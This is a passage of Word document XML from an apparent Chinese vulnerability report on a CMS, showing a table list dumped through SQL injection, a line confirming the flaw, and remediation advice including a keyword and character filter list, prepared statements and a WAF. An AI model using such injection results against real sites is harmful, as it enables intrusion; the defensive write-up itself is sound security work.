        <w:br/>
        <w:t>| cms_adpos             |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_archives          |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_auth_group        |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_auth_group_access |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_auth_rule         |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_bot               |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_cate              |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_conf              |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_html              |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_keywords          |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_link              |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_model             |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_model_fields      |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_note              |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_wenzhang          |</w:t>
        <w:br/>
        <w:br/>
        <w:t>+-----------------------+</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="DaHei"/>
      </w:pPr>
      <w:r>
        <w:t>复现完成，验证存在SQL注入漏洞</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
      <w:r>
        <w:t>修复建议</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Subtitle"/>
      </w:pPr>
      <w:r>
        <w:t>代码原理防护</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="DaHei"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        1.对用户的输入进行严格过滤，包括所有的参数，URL和HTTP头部等所有需要传给数据库的数据。</w:t>
        <w:br/>
        <w:t xml:space="preserve">        包括但不限于以下字符及字符串</w:t>
        <w:br/>
        <w:t xml:space="preserve">        select and or like regxp from where update exec order by having drop delete ( ) [ ] &lt; &gt; , . ; : ' " # % + - _ = / * @</w:t>
        <w:br/>
        <w:t xml:space="preserve">        2.预编译SQL语句，而不要动态组装SQL语句，否则必须确保在使用输入的数据组装成SQL语句之前，对特殊字符进行预处理。</w:t>
        <w:br/>
        <w:t xml:space="preserve">        3.以最小权限执行SQL语句</w:t>
        <w:br/>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Subtitle"/>
      </w:pPr>
      <w:r>
        <w:t>安全防火墙防护</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="DaHei"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        1.安装网站防火墙</w:t>
        <w:br/>
        <w:t xml:space="preserve">        2.接入云WAF</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